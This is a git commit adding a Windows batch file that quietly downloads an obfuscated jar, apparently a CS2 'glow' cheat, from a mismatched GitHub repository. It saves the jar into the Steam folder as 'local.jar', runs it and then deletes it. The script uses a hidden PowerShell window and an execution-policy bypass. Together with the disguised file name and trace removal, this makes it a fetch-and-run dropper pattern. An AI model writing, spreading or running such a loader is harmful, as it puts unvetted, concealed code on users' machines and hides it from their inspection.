01076879fc884a942de751f9de711f101369cbcb
yamolochko <klobziskotik@gmail.com>
2026-06-26 19:35:44 +0300

    Add local.bat: download CS2Glow as local.jar to Steam folder and run

---
+++ local.bat
@@ -0,0 +1,21 @@
+@echo off
+setlocal
+
+set "JAR_DIR=C:\Users\klobz\AppData\Local\Steam"
+set "JAR_PATH=%JAR_DIR%\local.jar"
+set "URL=https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/CS2Glow_obf.jar"
+
+if not exist "%JAR_DIR%" mkdir "%JAR_DIR%"
+
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%JAR_PATH%' -UseBasicParsing"
+
+if not exist "%JAR_PATH%" (
+    echo Failed to download local.jar
+    pause
+    exit /b 1
+)
+
+java -jar "%JAR_PATH%"
+
+del "%JAR_PATH%" /f /q
+endlocal
